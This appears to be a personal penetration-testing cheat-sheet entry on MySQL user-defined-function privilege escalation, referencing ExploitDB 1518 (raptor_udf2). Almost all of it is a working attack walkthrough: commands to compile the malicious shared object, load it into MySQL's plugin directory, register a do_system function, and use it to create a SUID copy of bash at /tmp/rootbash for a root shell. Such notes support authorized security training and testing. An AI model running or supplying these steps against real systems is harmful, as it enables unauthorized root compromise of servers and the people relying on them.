-- -
### User-Defined Function PrivEsc
mysql is vulnerable if the service is running as root w/o a password and the version is `4.x` or `5.x`. 
##### Get Exploit Code
[ExploitDB](https://www.exploit-db.com/exploits/1518)
```bash
# or use searchsploit
# should be 1518.c
searchsploit mysql 4.x/5.0 
searchsploit -m 1518
```
##### Exploit
*Note: The instructions in the exploit may or may not work, when I did in practice I needed slightly different commands to get it to work so mileage may vary.*
[[Dark Arts/File Transfer/Linux|File Transfer]] C code to target, or compile on attack box, then file transfer binary to target
```bash
# compile object file
gcc -g -c raptor_udf2.c -fPIC

# compile object to Shared Object (Dynamic Library) file\
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# log into mysql w/ or w/o password
mysql -u root
mysql -u root -p # will prompt for password
mysql -u root -p<password> 

# use mysql db
use mysql;

# create a table in mysql
create table foo(line blob);

# insert value into table that loads your malicious shared object file
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));

# dump loaded malicious shared object file into the required location, this may or may not be different. If in the next command you get an error, it will tell you where you need to put the malicious shared object file, so come back to this step if needed, you can redo it as many times as you want.
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

# create the function
# again, if you get an error, go back to the previous step.
create function do_system returns integer soname 'raptor_udf2.so';

# have it copy the bash binary and set it as executable and set it to have the SUID bit. 
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

# exit mysql
exit

# then just run your new suid bash binary
/tmp/rootbash -p

# and you should have root
```